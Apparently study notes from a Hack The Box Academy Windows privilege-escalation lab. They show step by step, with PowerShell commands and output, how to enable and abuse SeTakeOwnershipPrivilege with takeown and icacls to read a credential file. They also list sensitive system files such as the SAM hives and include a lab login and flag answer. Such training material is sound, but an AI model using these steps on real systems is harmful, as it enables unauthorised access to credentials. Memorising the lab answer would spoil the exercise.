# SeTakeOwnershipPrivilege
SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default.

## Leveraging the Privilege
### Enabling SeTakeOwnershipPrivilege
Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1):

```pwsh
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

### Taking Ownership of the File
Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.

```pwsh
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

### Confirming Ownership Changed

```pwsh
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

### Modifying the File ACL
Let's grant our user full privileges over the target file.

```pwsh
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

## When to Use?
### Files of Interest

```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

## Questions
RDP to 10.129.86.171 (ACADEMY-WINLPE-SRV01), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents. **Answer: 1m_th3_f1l3_0wn3r_n0W!**
   - Check that the owner of the file is not shown → do not have permission to view the object details:
        ```cmd
        C:\Windows\system32>cmd /c dir /q "C:\TakeOwn\flag.txt"
        Volume in drive C has no label.
        Volume Serial Number is 0C92-675B

        Directory of C:\TakeOwn

        06/04/2021  11:24 AM                22 ...                    flag.txt
                    1 File(s)             22 bytes
                    0 Dir(s)  18,147,475,456 bytes free
        ```
   - Check SeTakeOwnershipPrivilege is disabled:
        ```cmd
        C:\Windows\system32>whoami /priv

        PRIVILEGES INFORMATION
        ----------------------

        Privilege Name                Description                              State
        ============================= ======================================== ========
        SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
        SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
        SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
        ```
   - Enable SeTakeOwnershipPrivilege:
        ```cmd
        PS C:\Windows\system32> Import-Module C:\Tools\Enable-Privilege.ps1
        PS C:\Windows\system32> C:\Tools\EnableAllTokenPrivs.ps1
        PS C:\Windows\system32> whoami /priv

        PRIVILEGES INFORMATION
        ----------------------

        Privilege Name                Description                              State
        ============================= ======================================== =======
        SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
        SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
        SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
        ```
   - Take ownership of the file and read the flag:
        ```cmd
        PS C:\Windows\system32> takeown /f "C:\TakeOwn\flag.txt"

        SUCCESS: The file (or folder): "C:\TakeOwn\flag.txt" now owned by user "WINLPE-SRV01\htb-student".
        PS C:\Windows\system32> icacls "C:\TakeOwn\flag.txt" /grant htb-student:F
        processed file: C:\TakeOwn\flag.txt
        Successfully processed 1 files; Failed processing 0 files
        PS C:\Windows\system32> more "C:\TakeOwn\flag.txt"
        1m_th3_f1l3_0wn3r_n0W!
        ```